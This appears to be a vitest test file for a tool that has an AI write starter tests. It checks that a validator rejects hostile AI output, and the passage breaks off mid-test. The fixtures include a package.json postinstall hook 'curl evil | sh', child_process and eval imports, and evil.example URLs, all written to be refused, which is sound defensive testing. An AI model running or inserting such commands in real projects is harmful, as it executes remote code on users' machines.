// v0.2 Plan D, D7 (plan Task 5; rulings S9 and B2): the starter-test creator, its validator and the attempt rule. The AI's output is hostile input.
// Offline: the AI is mocked; npm is injected and writes a lock built from the REAL reviewed closure data (as in the D6 tests).
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import { TESTS_SYSTEM, testsInstructions } from '../src/ai/prompts/tests.js';
import { bundleCode, SecretScanRequiredError, type CodeBundle } from '../src/ai/redact.js';
import { loadReviewedClosure } from '../src/create/reviewed-closure.js';
import { gitBlobSha, guardCreatedFiles, type BaseTree } from '../src/create/guard.js';
import type { NpmRunner } from '../src/create/npm-deps.js';
import { SecretVault } from '../src/create/secrets.js';
import { checkAttempt, countAssertions, countTests, createStarterTests, StarterTestsError, testsSchema, validateGeneratedTests, type StarterDeps, type TestPlan } from '../src/create/tests.js';
import { CREATED_RULES } from '../src/engine/created-files.js';
import { pipegenDocProblems } from '../src/engine/created-judges/pipegen-doc.js';
import { referee, type Linters } from '../src/engine/referee.js';
import { emptyRepoFiles, emptyServiceQuality } from '../src/read/quality.js';
import { DEFAULT_MODEL, type AiProvider, type AiRequest, type AiUsage, type Capabilities, type CreatedFile, type PipelineDraft, type RepoProfile, type Service } from '../src/types.js';
import { packageDataPath } from '../src/util/package-data.js';
import { withActiveVault } from '../src/util/known-values.js';
import { CLEAN, gitleaksAt, makeStub, scanWith } from './helpers/gitleaks-stub.js';
import { cleanupRepos, makeTempDir, writeIn } from './helpers/make-repo.js';
import { platform, reviewedList } from './helpers/render.js';
import { strictProblems } from './helpers/strict-schema.js';

const usage = (input: number, output: number) => Object.fromEntries([['inputTokens', input], ['outputTokens', output]]) as unknown as AiUsage;
const svc = (over: Partial<Service> = {}): Service => ({
  name: 'api', path: 'api', language: 'node', packageManager: 'npm', runtimeVersion: '24', hasTests: false, envVars: [], dependsOn: [], scripts: ['start'], frameworks: ['express'], quality: emptyServiceQuality(), ...over,
});
const profileOf = (services: Service[]): RepoProfile => ({
  owner: 'o', repo: 'r', defaultBranch: 'main', private: false, ownerType: 'User', plan: 'free', monorepo: 'none', services,
  terraformDirs: [], hasCompose: false, existingWorkflows: [], precommit: null, repoFiles: emptyRepoFiles(),
});
const caps: Capabilities = { branchProtection: true, environments: false, envRequiredReviewers: false, deploymentBranchPolicies: false, attestations: true, codeScanning: true, keylessSigningAllowed: true };
const draftOf = (services: Service[]): PipelineDraft => ({ profile: profileOf(services), capabilities: caps, needs: [], steps: [], created: [], notProven: [], testDecisions: [], layersSkipped: [], scoreboard: [], requireDeployApproval: false, skipped: [], suggestions: [] });
const LINTERS: Linters = { actionlint: async () => '/x', zizmor: async () => '/x' };

// ----- the package fixtures (as in the D6 tests) -----
const pjFor = (extra = ''): string => `{\n  "name": "api",\n  "version": "1.0.0",\n  "scripts": {\n    "start": "node index.js",\n    "test": "echo \\"Error: no test specified\\" && exit 1"\n  },\n  "dependencies": {\n    "express": "4.21.0"${extra}\n  },\n  "devDependencies": {\n    "typescript": "5.6.0"\n  }\n}\n`;
const PJ = pjFor();
const expressEntries = { 'node_modules/express': { version: '4.21.0', resolved: 'https://registry.npmjs.org/express/-/express-4.21.0.tgz', integrity: `sha512-${Buffer.from('e'.repeat(64)).toString('base64')}` } };
const LOCK = JSON.stringify({ name: 'api', version: '1.0.0', lockfileVersion: 3, requires: true, packages: { '': { name: 'api', version: '1.0.0', dependencies: { express: '4.21.0' }, devDependencies: { typescript: '5.6.0' } }, ...expressEntries, 'node_modules/typescript': { version: '5.6.0', resolved: 'https://registry.npmjs.org/typescript/-/typescript-5.6.0.tgz', integrity: `sha512-${Buffer.from('t'.repeat(64)).toString('base64')}`, dev: true } } }, null, 2) + '\n';
const closureLock = (id: string): { packages: Record<string, Record<string, unknown>> } => JSON.parse(readFileSync(packageDataPath(`npm-closures/${id}.json`), 'utf8')) as never;
function fakeNpm(): { runner: NpmRunner; calls: number[] } {
  const calls: number[] = [];
  const runner: NpmRunner = (cwd) => {
    calls.push(1);
    const pj = JSON.parse(readFileSync(join(cwd, 'package.json'), 'utf8')) as { devDependencies: Record<string, string> };
    const lock = JSON.parse(readFileSync(join(cwd, 'package-lock.json'), 'utf8')) as { packages: Record<string, Record<string, unknown>> };
    (lock.packages[''] as { devDependencies: Record<string, string> }).devDependencies = Object.fromEntries(Object.entries(pj.devDependencies).sort(([a], [b]) => (a < b ? -1 : 1)));
    for (const [k, e] of Object.entries(closureLock('vitest-coverage').packages)) if (k !== '' && lock.packages[k] === undefined) lock.packages[k] = { ...e, dev: true };
    writeFileSync(join(cwd, 'package-lock.json'), `${JSON.stringify(lock, null, 2)}\n`);
    return { status: 0, output: '' };
  };
  return { runner, calls };
}
void execFileSync;

// ----- the tests the AI writes -----
const GOOD = "import { describe, expect, it } from 'vitest';\nimport { add } from '../src/add.js';\n\ndescribe('add', () => {\n  it('adds two numbers', () => {\n    expect(add(1, 2)).toBe(3);\n  });\n  it('adds zero', () => {\n    expect(add(5, 0)).toBe(5);\n    expect(add(0, 5)).toBe(5);\n  });\n});\n";
const GOOD2 = "import { expect, it } from 'vitest';\nimport path from 'node:path';\nit('uses path', () => { expect(typeof path.join).toBe('function'); expect(path.sep).toBeTruthy(); });\n";
const WITH_PKG = "import { expect, it } from 'vitest';\nimport express from 'express';\nit('loads express', () => { expect(typeof express).toBe('function'); expect(express.name).toBeTruthy(); });\n";
const ans = (files: { path: string; content: string }[], reasoning = 'Two small tests of the add function.') => ({ files, reasoning });

function mockAi(answers: unknown[]) {
  const calls: AiRequest[] = [];
  const complete = vi.fn(async (req: AiRequest) => {
    calls.push(req);
    const a = answers[Math.min(calls.length - 1, answers.length - 1)];
    if (a instanceof Error) throw a;
    return { data: a, usage: usage(100, 20) };
  });
  const p: AiProvider = { name: 'claude', model: DEFAULT_MODEL, complete };
  return { p, calls, complete };
}

let bundle: CodeBundle;
beforeAll(async () => {
  const dir = makeTempDir();
  writeIn(dir, 'api/package.json', PJ);
  writeIn(dir, 'api/src/add.js', 'export const add = (a, b) => a + b;\n');
  bundle = await bundleCode(dir, scanWith(gitleaksAt(makeStub(CLEAN).bin)));
});
const made: string[] = [];
afterAll(() => cleanupRepos());
afterEach(() => { for (const d of made.splice(0)) rmSync(d, { recursive: true, force: true }); });

const deps = (over: Partial<StarterDeps> = {}): StarterDeps => ({ fileExists: () => false, packageJson: PJ, packageLock: LOCK, reviewed: reviewedList(), npm: { runner: fakeNpm().runner }, isolatedTestJob: true, ...over });
const make = (answers: unknown[], s: Service = svc(), d: StarterDeps = deps()) => {
  const ai = mockAi(answers);
  return { ai, run: () => createStarterTests(s, profileOf([s]), bundle, ai.p, d) };
};
const cf = (path: string, content = GOOD): CreatedFile => ({ path, content, part: 'tests', reason: 't', repo: 'app' });

describe('tests: the plan', () => {
  it('tests: the plan reasons pass the PIPEGEN.md judge as written (Plan F decideTests returns them as decision.reasons; final review I1)', async () => {
    const plan = await make([ans([{ path: 'test/add.test.js', content: GOOD }])]).run();
    expect(plan.reasons.length).toBeGreaterThanOrEqual(2);
    for (const r of plan.reasons) expect(pipegenDocProblems(`# PIPEGEN\n\n- ${r}\n`, { owner: 'o', repo: 'r', containsKnownValue: () => false }), r).toEqual([]);
  });

  it('tests: plan has framework, reasons and files under test folder', async () => {
    const m = make([ans([{ path: 'test/add.test.js', content: GOOD }, { path: 'test/helpers/h.js', content: 'export const h = (n) => n * 2;\n' }])]);
    const plan = await m.run();
    expect(plan.framework).toBe('vitest 5.0.5');
    expect(plan.reasons.length).toBeGreaterThanOrEqual(2);
    expect(plan.reasons.join(' ')).toMatch(/current|today/);
    expect(plan.files.map((f) => f.path)).toEqual(['api/test/add.test.js', 'api/test/helpers/h.js']);
    for (const f of plan.files) expect(f).toMatchObject({ part: 'tests', repo: 'app' });
    for (const f of plan.files) expect(f.edited).toBeUndefined();
    expect(plan.files[0]?.content).toBe(GOOD);
    expect(plan.notes.join(' ')).toMatch(/Two small tests/);
    for (const f of plan.files) expect(f.reason).not.toMatch(/Two small tests/);   // the AI's words go into a note, never a file reason
    expect(plan.usage).toMatchObject(usage(100, 20));
    expect(m.ai.calls).toHaveLength(1);
    expect(m.ai.calls[0]?.system).toBe(TESTS_SYSTEM);
    expect(m.ai.calls[0]?.user).toContain(testsInstructions({ ext: 'js' }));
    expect(m.ai.calls[0]?.user).toContain('"version": "5.0.5"');
    expect(strictProblems(testsSchema.jsonSchema)).toEqual([]);
  });
  it('tests: a file without a final newline gets one, and CRLF becomes LF; helpers do not count as tests or assertions', async () => {
    const plan = await make([ans([{ path: 'test/add.test.js', content: GOOD.replace(/\n$/, '').replace(/\n/g, '\r\n') }])]).run();
    expect(plan.files[0]?.content).toBe(GOOD);
    expect(countAssertions([cf('api/test/helpers/h.js', GOOD)])).toBe(0);
    expect(countAssertions([cf('api/test/a.test.js', GOOD)])).toBe(3);
  });
  it('tests: config edits limited to devDependencies and scripts (guard passes)', async () => {
    const plan = await make([ans([{ path: 'test/add.test.js', content: GOOD }])]).run();
    expect(plan.configEdits.map((f) => f.path)).toEqual(['api/package.json', 'api/package-lock.json']);
    const before = JSON.parse(PJ) as Record<string, unknown>;
    const after = JSON.parse((plan.configEdits[0] as CreatedFile).content) as Record<string, unknown>;
    const { scripts: s0, devDependencies: d0, ...rest0 } = before as { scripts: Record<string, string>; devDependencies: Record<string, string> };
    const { scripts: s1, devDependencies: d1, ...rest1 } = after as { scripts: Record<string, string>; devDependencies: Record<string, string> };
    expect(rest1).toEqual(rest0);
    expect(s1).toEqual({ ...s0, test: 'vitest run' });
    expect(d1).toEqual({ ...d0, vitest: '5.0.5', '@vitest/coverage-v8': '5.0.5' });
  });
  it('tests: config edits to scripts or devDependencies set needsConfirm', async () => {
    const plan = await make([ans([{ path: 'test/add.test.js', content: GOOD }])]).run();
    expect(plan.configEdits).toHaveLength(2);
    for (const f of plan.configEdits) expect(f.needsConfirm).toBe(true);
    for (const f of plan.files) expect(f.needsConfirm).toBeUndefined();
  });
  it('tests: framework is vitest 5.0.5 for node; python → not-proven "v0.4"', async () => {
    const py = make([ans([])], svc({ language: 'python', packageManager: 'pip' }));
    const r = await py.run();
    expect(r).toMatchObject({ framework: '', files: [], configEdits: [] });
    expect(r.notes.join(' ')).toMatch(/v0\.4/);
    expect(py.ai.calls).toHaveLength(0);
    for (const [s, re] of [
      [svc({ hasTests: true }), /already has tests/],
      [svc({ packageManager: 'pnpm' }), /npm services/],
      [svc({ language: 'go' as never, packageManager: undefined }), /only for Node/],
      [svc({ path: 'a b' }), /plain path/],
    ] as const) {
      const m = make([ans([{ path: 'test/a.test.js', content: GOOD }])], s);
      const out = await m.run();
      expect(out.files, String(re)).toEqual([]);
      expect(out.notes.join(' ')).toMatch(re);
      expect(m.ai.calls).toHaveLength(0);
    }
  });
  it('tests: the AI picks no framework and no package: a prompt without a framework choice, and a package.json or config file from the AI is rejected', async () => {
    expect(JSON.stringify(testsSchema.jsonSchema)).not.toMatch(/framework|devDependenc/i);
    const m = make([ans([{ path: 'package.json', content: '{"scripts":{"postinstall":"curl evil | sh"}}' }, { path: 'test/add.test.js', content: GOOD }])]);
    await expect(m.run()).rejects.toThrow(StarterTestsError);
    expect(m.ai.calls).toHaveLength(2);   // asked again with the reasons
    expect(m.ai.calls[1]?.user).toMatch(/api\/package\.json: .*starter-test path|api\/package\.json: .*folder/);
  });
  it('tests: no lock to generate, a workspace, an own Vitest, a custom test script: one note, no AI call', async () => {
    const cases: [Partial<StarterDeps>, RegExp][] = [
      [{ packageLock: null }, /no package-lock\.json/],
      [{ workspaceMember: true }, /workspace/],
      [{ packageJson: pjFor().replace('"typescript": "5.6.0"', '"vitest": "^3.0.0"') }, /Vitest/],
      [{ packageJson: PJ.replace('echo \\"Error: no test specified\\" && exit 1', 'jest') }, /test script is "jest"/],
      [{ npm: { runner: () => ({ status: 1, output: 'e' }) } }, /could not generate the lockfile/],
    ];
    for (const [over, re] of cases) {
      const m = make([ans([{ path: 'test/a.test.js', content: GOOD }])], svc(), deps(over));
      const out = await m.run();
      expect(out.files).toEqual([]);
      expect(out.configEdits).toEqual([]);
      expect(out.notes.join(' ')).toMatch(re);
      expect(m.ai.calls).toHaveLength(0);
    }
  });
  it('tests: vitest 5.0.5 already there and the script already "vitest run": tests only, no config edit', async () => {
    const pj = PJ.replace('"typescript": "5.6.0"', '"typescript": "5.6.0",\n    "vitest": "5.0.5",\n    "@vitest/coverage-v8": "5.0.5"').replace('echo \\"Error: no test specified\\" && exit 1', 'vitest run');
    const plan = await make([ans([{ path: 'test/add.test.js', content: GOOD }])], svc(), deps({ packageJson: pj })).run();
    expect(plan.configEdits).toEqual([]);
    expect(plan.files).toHaveLength(1);
  });
  it('tests: the bundle must have passed the secret scan, before anything else', async () => {
    const m = mockAi([ans([])]);
    const unchecked: CodeBundle = { ...bundle, ['secretScan' + 'Checked']: !bundle.secretScanChecked };   // built at runtime so no redact pattern sees a name = value pair here
    await expect(createStarterTests(svc(), profileOf([svc()]), unchecked, m.p, deps())).rejects.toThrow(SecretScanRequiredError);
    expect(m.calls).toHaveLength(0);
  });
  it('no starter tests without the isolated test job', async () => {
    for (const over of [{ isolatedTestJob: undefined }, { isolatedTestJob: false }]) {
      const m = mockAi([ans([{ path: 'test/add.test.js', content: GOOD }])]);
      const plan = await createStarterTests(svc(), profileOf([svc()]), bundle, m.p, deps(over));
      expect(plan.files).toEqual([]);
      expect(plan.configEdits).toEqual([]);
      expect(plan.notes).toHaveLength(1);
      expect(plan.notes[0]).toContain('isolated CI job');
      expect(m.calls).toHaveLength(0);
      expect(m.complete).not.toHaveBeenCalled();
    }
  });
  it('the secret-scan check still comes first without the isolated job', async () => {
    const m = mockAi([ans([])]);
    const unchecked: CodeBundle = { ...bundle, ['secretScan' + 'Checked']: !bundle.secretScanChecked };
    await expect(createStarterTests(svc(), profileOf([svc()]), unchecked, m.p, deps({ isolatedTestJob: false }))).rejects.toThrow(SecretScanRequiredError);
    expect(m.calls).toHaveLength(0);
  });
  it('tests: a service at the repo root writes under test/, and tsconfig picks .ts in the prompt', async () => {
    const root = svc({ path: '.', quality: { ...emptyServiceQuality(), tsconfig: true } });
    const m = make([ans([{ path: 'test/add.test.ts', content: GOOD }])], root);
    const plan = await m.run();
    expect(plan.files.map((f) => f.path)).toEqual(['test/add.test.ts']);
    expect(plan.configEdits.map((f) => f.path)).toEqual(['package.json', 'package-lock.json']);
    expect(m.ai.calls[0]?.user).toContain('"fileExtension": "ts"');
  });
});

describe('tests: refused answers are asked again once, then the part fails', () => {
  it('a first refusal is retried with the reasons (and the AI text in them is scrubbed); a good second answer is used', async () => {
    const bad = "import cp from 'node:child_process';\nimport { it, expect } from 'vitest';\nit('a', () => { expect(cp).toBeTruthy(); });\n";
    const m = make([ans([{ path: 'test/a.test.js', content: bad }]), ans([{ path: 'test/a.test.js', content: GOOD }])]);
    const plan = await m.run();
    expect(plan.files.map((f) => f.content)).toEqual([GOOD]);
    expect(m.ai.calls).toHaveLength(2);
    expect(m.ai.calls[1]?.user).toMatch(/api\/test\/a\.test\.js: .*node:child_process/);
    expect(plan.usage).toMatchObject(usage(200, 40));
  });
  it('two refusals throw StarterTestsError with the problems and both calls\' usage', async () => {
    const bad = "import { it } from 'vitest';\nit('a', () => {});\n";
    const m = make([ans([{ path: 'test/a.test.js', content: bad }])]);
    const err = await m.run().catch((e: unknown) => e) as StarterTestsError;
    expect(err).toBeInstanceOf(StarterTestsError);
    expect(err.problems.join(' ')).toMatch(/no assertion/);
    expect(err.usage).toMatchObject(usage(200, 40));
    expect(err.message).toMatch(/refused twice/);
  });
  it('no files, or only helpers, is a refusal', async () => {
    const e1 = await make([ans([])]).run().catch((e: unknown) => e) as StarterTestsError;
    expect(e1.problems).toEqual(['no test file was written']);
    const e2 = await make([ans([{ path: 'test/helpers/h.js', content: 'export const h = 1;\n' }])]).run().catch((e: unknown) => e) as StarterTestsError;
    expect(e2.problems.join(' ')).toMatch(/only helpers/);
  });
  it('an AI error carries no hidden state: it is thrown as is (the usage of billed calls is kept)', async () => {
    const boom = Object.assign(new Error('boom'), { usage: usage(7, 3) });
    await expect(make([boom]).run()).rejects.toThrow();
  });
  it('a vault value inside a rejected file is not shown in the reasons', async () => {
    const value = 'zzvaultvalue98765qwerty';
    const vault = new SecretVault();
    vault.set('K_T', value);
    const bad = `import x from '${value}';\nimport { it, expect } from 'vitest';\nit('a', () => { expect(x).toBeTruthy(); });\n`;
    const m = make([ans([{ path: 'test/a.test.js', content: bad }])]);
    const err = await withActiveVault(vault, () => m.run().catch((e: unknown) => e)) as StarterTestsError;
    expect(err).toBeInstanceOf(StarterTestsError);
    expect(JSON.stringify([err.message, err.problems, m.ai.calls[1]?.user.split('refused for these reasons')[1]])).not.toContain(value);
  });
});

describe('validate: what may be delivered', () => {
  const s = svc();
  const v = (files: CreatedFile[], exists: (p: string) => boolean = () => false) => validateGeneratedTests(files, s, exists);
  it('validate: path traversal rejected', () => {
    for (const path of ['api/test/../../x.test.js', 'api/../test/a.test.js', '/etc/a.test.js', 'api//test/a.test.js', 'api/test/../a.test.js', 'api/test/./a.test.js', '../api/test/a.test.js', 'api\\test\\a.test.js', 'other/test/a.test.js', 'test/a.test.js', 'api/src/a.test.js', 'api/test/a.js']) {
      const r = v([cf(path)]);
      expect(r.accepted, path).toEqual([]);
      expect(r.rejected, path).toHaveLength(1);
      expect(r.rejected[0]?.why.length).toBeGreaterThan(5);
    }
  });
  it('validate: existing file rejected', () => {
    const r = v([cf('api/test/a.test.js'), cf('api/test/b.test.js')], (p) => p === 'api/test/a.test.js');
    expect(r.accepted.map((f) => f.path)).toEqual(['api/test/b.test.js']);
    expect(r.rejected).toEqual([{ path: 'api/test/a.test.js', why: expect.stringMatching(/already exists.*never overwrites/) }]);
  });
  it('validate: a path that differs only in letter case from another is rejected, and so is the same path twice', () => {
    const r = v([cf('api/test/a.test.js'), cf('api/test/A.test.js'), cf('api/test/a.test.js')]);
    expect(r.accepted.map((f) => f.path)).toEqual(['api/test/a.test.js']);
    expect(r.rejected).toHaveLength(2);
  });
  it('validate: child_process rejected with why', () => {
    for (const code of ["import cp from 'node:child_process';", "import cp from 'child_process';", "const cp = require('child_process');", "import { exec } from 'node:child_process';", "const m = 'child' + '_process'; await import(m);"]) {
      const r = v([cf('api/test/a.test.mjs', `import { it, expect } from 'vitest';\n${code}\nit('a', async () => { expect(1 + f()).toBe(2); });\n`)]);
      expect(r.accepted, code).toEqual([]);
      expect(r.rejected[0]?.why, code).toMatch(/child_process|plain string|require|not accepted/);
    }
    expect(v([cf('api/test/a.test.mjs', "import cp from 'node:child_process';\nimport { it, expect } from 'vitest';\nit('a', () => { expect(cp).toBeTruthy(); });\n")]).rejected[0]?.why).toMatch(/"node:child_process", which can run commands/);
  });
  it('validate: external URL rejected, localhost allowed', () => {
    const t = (url: string): string => `import { it, expect } from 'vitest';\nconst f = (x) => x;\nit('a', () => { expect(f('${url}')).toBeTruthy(); });\n`;
    expect(v([cf('api/test/a.test.js', t('https://evil.example/x'))]).rejected[0]?.why).toMatch(/evil\.example/);
    expect(v([cf('api/test/a.test.js', t('http://localhost:3000/x'))]).rejected).toEqual([]);
    expect(v([cf('api/test/a.test.js', t('http://127.0.0.1/x'))]).rejected).toEqual([]);
    expect(v([cf('api/test/a.test.js', t('https://example.com/x'))]).rejected).toEqual([]);
  });
  it('validate: 21st file rejected', () => {
    const files = Array.from({ length: 21 }, (_, i) => cf(`api/test/t${i}.test.js`));
    const r = v(files);
    expect(r.accepted).toHaveLength(20);
    expect(r.rejected).toEqual([{ path: 'api/test/t20.test.js', why: expect.stringMatching(/at most 20/) }]);
    expect(v(files.slice(0, 20)).rejected).toEqual([]);
  });
  it('validate: a file over 50 KB rejected', () => {
    const r = v([cf('api/test/a.test.js', `${GOOD}// ${'x'.repeat(50 * 1024)}\n`)]);
    expect(r.rejected[0]?.why).toMatch(/over 50 KB/);
  });
  it('validate: .skip and .only rejected', () => {
    for (const form of ['it.skip', 'it.only', 'describe.skip', 'test.todo', "it['sk' + 'ip']", 'xit', 'fit']) {
      const r = v([cf('api/test/a.test.js', `import { it, test, describe, expect } from 'vitest';\nconst f = () => 1, add = f;\n${GOOD.split('\n').slice(2).join('\n')}\n${form}('b', () => { expect(f()).toBe(1); });\n`)]);
      expect(r.accepted, form).toEqual([]);
      expect(r.rejected[0]?.why, form).toMatch(/skip|only|todo|focus/i);
    }
  });
  it('validate: pytest.mark.skip rejected (a python test file is not a starter-test path at all)', () => {
    const r = validateGeneratedTests([cf('api/tests/test_a.py', 'import pytest\n\n@pytest.mark.skip\ndef test_a():\n    assert 1 == 1\n'), cf('api/tests/conftest.py', 'x = 1\n')], s, () => false);
    expect(r.accepted).toEqual([]);
    expect(r.rejected).toHaveLength(2);
    expect(r.rejected[0]?.why).toMatch(/test, tests or __tests__|named/);
  });
  it('validate: vitest.config.* / vite.config.* path → rejected', () => {
    for (const path of ['api/vitest.config.ts', 'api/vite.config.js', 'api/test/vitest.config.test.ts', 'api/tests/vite.config.spec.test.js', 'api/test/helpers/vitest.config.ts', 'api/test/helpers/vitest.workspace.js']) {
      const r = v([cf(path)]);
      expect(r.accepted, path).toEqual([]);
      expect(r.rejected, path).toHaveLength(1);
    }
  });
  it('validate: a path the gate protects is rejected (the gate\'s own matcher, not a name list)', () => {
    for (const path of ['api/test/prettier.config.test.js', 'api/tests/prettier.config.test.ts', 'api/test/knip.config.test.js', 'api/__tests__/vitest.workspace.test.mjs', 'api/test/PRETTIER.config.test.js']) {
      const r = v([cf(path)]);
      expect(r.accepted, path).toEqual([]);
      expect(r.rejected[0]?.why, path).toMatch(/gate protects|config/);
    }
    expect(v([cf('api/test/eslint.config.test.js')]).accepted).toHaveLength(1);   // not a protected name: a plain test file
  });
  it('validate: an import outside the allowlist, or of any package, is rejected', () => {
    const imp = (spec: string): string => `import x from '${spec}';\nimport { it, expect } from 'vitest';\nit('a', () => { expect(x).toBeTruthy(); });\n`;
    for (const spec of ['lodash', 'node:fs', 'node:vm', 'worker_threads', 'https://evil.example/x.js', '../../etc/x.js']) expect(v([cf('api/test/a.test.js', imp(spec))]).accepted, spec).toEqual([]);
    expect(v([cf('api/test/a.test.js', imp('express'))]).accepted).toEqual([]);   // not even a dependency of the service (S9 amended in D7 round 3)
    expect(v([cf('api/test/a.test.js', imp('express'))], () => false).accepted).toEqual([]);
    expect(v([cf('api/test/a.test.js', imp('../src/add.js'))]).accepted).toHaveLength(1);
  });
  it('validate: eval, new Function, process.binding, module.createRequire rejected', () => {
    for (const code of ['eval("1")', 'new Function("return 1")()', 'process.binding("fs")', "process['bind' + 'ing']('fs')", "module.createRequire('x')", "globalThis['ev' + 'al']('1')"]) {
      const r = v([cf('api/test/a.test.js', `import { it, expect } from 'vitest';\nconst f = () => 1;\nit('a', () => { ${code}; expect(f()).toBe(1); });\n`)]);
      expect(r.accepted, code).toEqual([]);
    }
  });
  it("validate: a test with no expect/assert → rejected; assertion count can't drop between attempts", () => {
    const none = cf('api/test/a.test.js', "import { it } from 'vitest';\nit('a', () => { 1 + 1; });\n");
    expect(v([none]).rejected[0]?.why).toMatch(/no assertion/);
    const plan = (files: CreatedFile[]): TestPlan => ({ framework: 'vitest 5.0.5', reasons: [], files, configEdits: [], notes: [] });
    const strong = cf('api/test/a.test.js', GOOD);
    const weak = cf('api/test/a.test.js', GOOD.replace('expect(add(0, 5)).toBe(5);', '').replace('expect(add(5, 0)).toBe(5);', 'add(5, 0);'));
    expect(checkAttempt(plan([strong]), plan([weak])).join(' ')).toMatch(/fewer/);
  });
  it('validate: a test with no expect/assert rejected', () => {
    const r = v([cf('api/test/a.test.js', "import { it } from 'vitest';\nit('a', () => { f(); });\n")]);
    expect(r.rejected[0]?.why).toMatch(/no assertion/);
  });
  it('validate: a file that does not parse is rejected, and a non-file does not crash', () => {
    expect(v([cf('api/test/a.test.js', 'it("a", () => {')]).rejected[0]?.why).toMatch(/does not parse/);
    const r = v([{ path: 5, content: 'x' } as unknown as CreatedFile, null as unknown as CreatedFile]);
    expect(r.rejected).toHaveLength(2);
  });
  it('validate: the reasons never show a vault value', () => {
    const value = 'zzvaultvalue98765qwerty';
    const vault = new SecretVault();
    vault.set('K_V', value);
    const r = withActiveVault(vault, () => v([cf(`api/test/${value}.test.js`), cf('api/test/b.test.js', `import x from '${value}';\nimport { it, expect } from 'vitest';\nit('a', () => { expect(x).toBe(1); });\n`)]));
    expect(JSON.stringify(r.rejected)).not.toContain(value);
    expect(r.rejected).toHaveLength(1);   // the file named with the value is the guard's to refuse (its path check), not a content problem
  });
});

describe('module type', () => {
  it('the module type reaches the validator and the creator: a script-only file is refused in a "type": "module" package', async () => {
    const src = "const { it, expect } = require('vitest');\nvar o = 010;\nit('a', () => { expect(o).toBe(8); });\n";
    const file: CreatedFile = { path: 'api/test/a.test.js', content: src, part: 'tests', reason: 't', repo: 'app' };
    expect(validateGeneratedTests([file], svc(), () => false, 'module').rejected[0]?.why).toMatch(/does not parse/);
    expect(validateGeneratedTests([file], svc(), () => false, 'commonjs').rejected).toEqual([]);
    expect(validateGeneratedTests([file], svc(), () => false).rejected).toEqual([]);
    const asModule = deps({ packageJson: PJ.replace('"version": "1.0.0",', '"version": "1.0.0",\n  "type": "module",') });
    const bad = await make([ans([{ path: 'test/a.test.js', content: src }])], svc(), asModule).run().catch((e: unknown) => e);
    expect(bad).toBeInstanceOf(StarterTestsError);
    const fine = await make([ans([{ path: 'test/a.test.js', content: src }])]).run();
    expect(fine.files).toHaveLength(1);
  });
});

describe('attempt: the count can not drop between attempts', () => {
  const plan = (files: CreatedFile[]): TestPlan => ({ framework: 'vitest 5.0.5', reasons: [], files, configEdits: [], notes: [] });
  const two = cf('api/test/a.test.js', GOOD);   // 3 tests? no: 2 tests, 3 assertions
  it('countTests counts it/test calls by parsing, assertions directly in tests', () => {
    expect(countTests([two])).toBe(2);
    expect(countAssertions([two])).toBe(3);
    expect(countTests([cf('api/test/helpers/h.js', GOOD)])).toBe(0);   // helpers are not test files
    expect(countTests([cf('api/test/a.test.js', '{{{')])).toBe(0);   // unreadable counts nothing
    expect(countTests([cf('api/test/a.test.js', "// it('a', () => {})\nconst s = \"it('b', () => {})\";\n")])).toBe(0);   // comments and strings are not tests
  });
  it('attempt: fewer tests than the previous attempt → rejected', () => {
    const one = cf('api/test/a.test.js', "import { it, expect } from 'vitest';\nit('a', () => { expect(f()).toBe(1); expect(g()).toBe(2); expect(h()).toBe(3); });\n");
    const p = checkAttempt(plan([two]), plan([one]));
    expect(p).toHaveLength(1);
    expect(p[0]).toMatch(/1 test, fewer than the 2/);
    expect(checkAttempt(plan([two]), plan([]))[0]).toMatch(/0 tests, fewer than the 2/);
    expect(checkAttempt(plan([two]), plan([two]))).toEqual([]);
    expect(checkAttempt(plan([one]), plan([two]))).toEqual([]);
    expect(checkAttempt(null, plan([]))).toEqual([]);
  });
  it('attempt: fewer assertions than the previous attempt → rejected (the same tests, checking less)', () => {
    const weaker = cf('api/test/a.test.js', GOOD.replace('expect(add(0, 5)).toBe(5);', '').replace('expect(add(5, 0)).toBe(5);', 'expect(add(5, 0)).toBeDefined();'));
    expect(countTests([weaker])).toBe(2);
    expect(checkAttempt(plan([two]), plan([weaker]))[0]).toMatch(/1 assertion, fewer than the 3|2 assertions, fewer than the 3/);
    // a test hidden in a file that no longer parses counts as gone
    expect(checkAttempt(plan([two]), plan([cf('api/test/a.test.js', `${GOOD}}}`)]))[0]).toMatch(/fewer/);
    // more is fine
    expect(checkAttempt(plan([weaker]), plan([two]))).toEqual([]);
  });
  it('attempt: both rules can fire at once', () => {
    expect(checkAttempt(plan([two]), plan([]))).toHaveLength(2);
  });
});

// ---- the producer's real output passes the referee AND the guard (D0a review rule) ----
describe('the producer\'s real output passes the referee and the guard', () => {
  function repoDir(files: Record<string, string>): { root: string; base: BaseTree } {
    const root = mkdtempSync(join(tmpdir(), 'pipegen-d7-'));
    made.push(root);
    for (const [p, t] of Object.entries(files)) { mkdirSync(join(root, dirname(p)), { recursive: true }); writeFileSync(join(root, p), t); }
    return { root, base: { complete: true, entries: new Map(Object.entries(files).map(([p, t]) => [p, { sha: gitBlobSha(t), mode: '100644', read: async () => t }])) } };
  }
  const refereeOf = (files: CreatedFile[], s: Service, inputs: Record<string, unknown>) => referee(files, draftOf([s]), platform(), reviewedList(), LINTERS, 'tok', { runLinters: async () => [], createdInputs: inputs as never });
  it('the creator\'s files and package edits are judged by the referee and the guard with no issue', async () => {
    const s = svc();
    const plan = await make([ans([{ path: 'test/add.test.js', content: GOOD }, { path: 'test/helpers/h.js', content: 'export const h = (n) => n * 2;\n' }, { path: 'tests/express.test.js', content: GOOD2 }])], s).run();
    const all = [...plan.files, ...plan.configEdits];
    const r = await refereeOf(all, s, { isolatedTestJob: true });
    expect(r.issues.map((i) => `${i.file}: ${i.message}`)).toEqual([]);
    const { root, base } = repoDir({ 'api/package.json': PJ, 'api/package-lock.json': LOCK, 'api/src/add.js': 'export const add = (a, b) => a + b;\n' });
    const g = await guardCreatedFiles(all, { root, baseTree: base, installRecord: null, profile: profileOf([s]), closure: loadReviewedClosure(reviewedList()), isolatedTestJob: true });
    expect(g.refused).toEqual([]);
    expect(g.ok.map((f) => f.path).sort()).toEqual(all.map((f) => f.path).sort());
  });
  it('the referee refuses a package import, even of a dependency of the service, and a changed byte', async () => {
    const s = svc();
    const plan = await make([ans([{ path: 'test/path.test.js', content: GOOD2 }])], s).run();
    const pkg = { ...(plan.files[0] as CreatedFile), content: WITH_PKG };
